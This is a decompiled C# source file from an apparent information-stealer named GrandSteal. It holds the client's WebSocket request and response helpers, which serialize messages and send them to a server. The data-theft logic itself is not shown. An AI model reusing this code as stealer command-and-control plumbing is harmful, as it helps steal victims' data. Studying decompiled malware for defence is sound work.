using System;
using System.Threading;
using GrandSteal.Client.Models;
using GrandSteal.Client.Models.Extensions;
using GrandSteal.SharedModels.Communication;
using WebSocket4Net;

namespace GrandSteal.Client.Data.Server
{
	// Token: 0x02000008 RID: 8
	public static class RequestsExtensions
	{
		// Token: 0x06000035 RID: 53 RVA: 0x00003A48 File Offset: 0x00001C48
		public static bool? HandleResponse(this ResponseBase response)
		{
			ResponseHandler expr_05 = RequestsExtensions.OnResponseRecieved;
			if (expr_05 == null)
			{
				return null;
			}
			return new bool?(expr_05(response));
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000021FC File Offset: 0x000003FC
		public static AsyncAction SendResponse<TInput>(this RequestBase request, WebSocket session, TInput objectToSend)
		{
			return AsyncTask.StartNew(delegate
			{
				byte[] array = request.CreateResponse<TInput>(objectToSend).SerializeProto<Response<TInput>>();
				session.Send(array, 0, array.Length);
			});
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00002228 File Offset: 0x00000428
		public static AsyncAction SendRequest<TInput>(this WebSocket session, TInput objectToSend, string Name)
		{
			return AsyncTask.StartNew(delegate
			{
				byte[] array = new Request<TInput>(objectToSend, Name).SerializeProto<Request<TInput>>();
				session.Send(array, 0, array.Length);
			});
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00002254 File Offset: 0x00000454
		public static AsyncAction<TResult> SendRequest<TInput, TResult>(this WebSocket session, TInput objectToSend, string Name, int timeoutMilliseconds = 60000)
		{
			return AsyncTask.StartNew<TResult>(delegate
			{
				TResult result;
				try
				{
					RequestsExtensions.<>c__DisplayClass4_1<TInput, TResult> <>c__DisplayClass4_ = new RequestsExtensions.<>c__DisplayClass4_1<TInput, TResult>();
					DateTime t = DateTime.Now.AddMilliseconds((double)timeoutMilliseconds);
					<>c__DisplayClass4_.localRequest = new Request<TInput>(objectToSend, Name);
					<>c__DisplayClass4_.handled = false;
					<>c__DisplayClass4_.result = default(TResult);
					RequestsExtensions.OnResponseRecieved = (ResponseHandler)Delegate.Combine(RequestsExtensions.OnResponseRecieved, new ResponseHandler(<>c__DisplayClass4_.method_0));
					byte[] array = <>c__DisplayClass4_.localRequest.SerializeProto<Request<TInput>>();
					session.Send(array, 0, array.Length);
					while (t >= DateTime.Now && !<>c__DisplayClass4_.handled)
					{
						Thread.Sleep(100);
					}
					RequestsExtensions.OnResponseRecieved = (ResponseHandler)Delegate.Remove(RequestsExtensions.OnResponseRecieved, new ResponseHandler(<>c__DisplayClass4_.method_0));
					result = <>c__DisplayClass4_.result;
				}
				catch (Exception arg_C9_0)
				{
					Console.WriteLine(arg_C9_0);
					result = default(TResult);
				}
				return result;
			});
		}

		// Token: 0x04000013 RID: 19
		public static ResponseHandler OnResponseRecieved;
	}
}
